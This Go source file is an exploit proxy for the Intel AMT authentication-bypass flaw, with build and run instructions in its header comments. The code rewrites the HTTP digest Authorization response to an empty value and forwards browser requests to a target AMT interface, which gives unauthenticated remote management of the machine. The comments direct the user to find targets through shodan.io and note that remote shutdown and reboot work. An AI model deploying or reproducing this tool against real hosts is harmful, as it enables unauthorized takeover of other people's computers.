// READ
// https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability
 
// BUILD (tested with go 1.8.1)
// save this file as 'x.go' in current directory and compile with:
//   go build -o ap
 
// RUN
// pick your target through shodan.io and start proxy:
//        -----TARGET-----
//   ./ap http://host:port     #   for *nix
//     ap http://host:port     REM for  win cmd
 
// EXPLOIT
// browse to http://localhost:16992
 
// ISSUES
// some form HTTP POST actions still result in a session expired message
// shutdown, reboot, etc. work

////////////////////////////////////////////////////////////////////////////////////////////////////

package main

import ( "net/http"; "net/url"; "os"; "fmt"; "io/ioutil"; "regexp"; "bytes"; "strings" )

var t *url.URL
var c = http.Client{}
var h = `Authorization`
var f = regexp.MustCompile(`response\s*="[0-9a-f]+"`)
var r =                    `response=""`
var o = `Origin`
var x = `Referer`
var l = `localhost:16992`

func hxr(n http.Header, h string, f *regexp.Regexp, r string) { n.Set(h, f.ReplaceAllString(n.Get(h), r    )) }
func hsr(n http.Header, h string, f         string, r string) { n.Set(h, strings.Replace(strings.ToLower(n.Get(h)), f, r, -1)) }

func amt(w http.ResponseWriter, q *http.Request) {
	// REQUEST
	u, _ := url.Parse(q.URL.String()); u.Scheme = t.Scheme; u.Host = t.Host
	n    := &http.Request{ URL: u, Method: q.Method, Header: q.Header, Body: q.Body }
	hxr(n.Header, h, f, r)
	hsr(n.Header, o, l, t.Host)
	hsr(n.Header, x, l, t.Host)
	if q.Method == "POST" { b, e := ioutil.ReadAll(q.Body); if e == nil {
		fmt.Println(q.Method, u, string(b))
		n.Body = ioutil.NopCloser(bytes.NewReader(b))
		n.ContentLength = int64(len(b))
	} } else { fmt.Println(q.Method, u) }
	// RESPONSE
	s, e := c.Do(n); if e != nil { w.WriteHeader(500); w.Write([]byte(e.Error())); fmt.Println(500, e); return }
	h    := w.Header(); for k, vs := range s.Header { for _, v := range vs { h.Add(k, v) } }
	b, e := ioutil.ReadAll(s.Body); if e != nil { fmt.Println("body", e); return }; w.WriteHeader(s.StatusCode); w.Write(b)
}

func main() {
	if len(os.Args) == 1 { fmt.Println("usage:", os.Args[0], "<target-host>:<target-port>", fmt.Sprint("[<listen-host>:<listen:port>=",l,"]")); return }
	p, e := url.Parse(os.Args[1]); if e != nil { fmt.Println(e); return }; t = p; if len(os.Args)  > 2 { l = os.Args[2] }
	fmt.Println("http",   l)
	fmt.Println(t.Scheme, t.Host)
	fmt.Println(http.ListenAndServe(l, http.HandlerFunc(amt)))
}
